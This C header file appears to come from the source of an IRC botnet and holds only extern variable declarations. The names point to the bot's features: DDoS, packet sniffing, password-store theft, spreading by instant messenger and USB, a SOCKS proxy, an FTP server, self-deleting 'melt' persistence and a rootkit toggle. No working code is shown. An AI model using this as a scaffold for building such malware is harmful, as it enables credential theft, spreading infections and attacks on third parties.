extern char botid[];
extern char version[];
extern char mutexhandle[];
extern char movepath[];
extern char filename[];
extern char password[];
extern char prefix;
extern char *authost[];
extern int authsize;
extern SERVER servers[];
extern int curserver;

#ifndef NO_MELT
extern REGENT meltkey;
#endif

#ifndef NO_SERVICE
extern char servicename[];
extern char servicedisplayname[];
extern char servicedesc[];
#else
extern REGENT runkey;
#endif
extern char drives_title[];
extern char process_title[];
extern char irc_title[];
extern char mirc_title[];
extern char file_title[];
extern char download_title[];
extern char update_title[];
extern char logic_title[];
extern char reg_title[];
extern char pstore_title[];
extern char netstatp_title[];
extern char tcp_title[];
extern char udp_title[];
extern char ftp_title[];
extern char pstore_chan[];
extern char sock4_title[];
extern char warn_title[];
extern char ddos_title[];
extern char sniffer_title[];
extern char visit_title[];
extern char imspread_title[];
extern char timspread_title[];
extern char aimspread_title[];
extern char str_msn_msg[];
extern HANDLE ih;
extern char exip[MAX_IP];
extern char inip[MAX_IP];
extern char host[MAX_HOSTNAME];
extern unsigned short sock4port;
extern int eftpsends;
extern int FTP_PORT;
extern BOOL staticftpd;
extern unsigned short ftpdport;
extern char USB_CHANNEL[];
extern char USB_STR_FILENAME[];
extern const char cmd_login_1[];
extern const char cmd_login_2[];
extern DWORD dwstarted;
extern DWORD dwconnected;
extern char main_title[];
extern char threads_title[];
extern THREAD threads[MAX_THREADS];
extern BOOL rkenabled;
extern HANDLE mutex;

